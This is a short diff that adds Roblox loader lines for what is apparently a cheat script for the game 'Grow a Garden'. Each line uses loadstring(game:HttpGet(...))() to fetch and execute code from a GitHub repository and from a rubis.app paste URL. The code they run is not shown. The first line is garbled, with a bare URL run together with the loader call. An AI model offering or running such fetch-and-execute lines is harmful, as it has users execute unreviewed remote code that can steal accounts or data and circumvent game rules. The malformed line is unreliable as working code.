@@ -1,0 +1,2 @@
+https://raw.githubusercontent.com/Growagarden-v4/GrowagardenScript/refs/heads/main/LimithubVisualloadstring(game:HttpGet("https://raw.githubusercontent.com/Growagarden-v4/GrowagardenScript/refs/heads/main/LimithubVisual", true))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/Ckcy3f72bCYTvL3r/raw", true))()
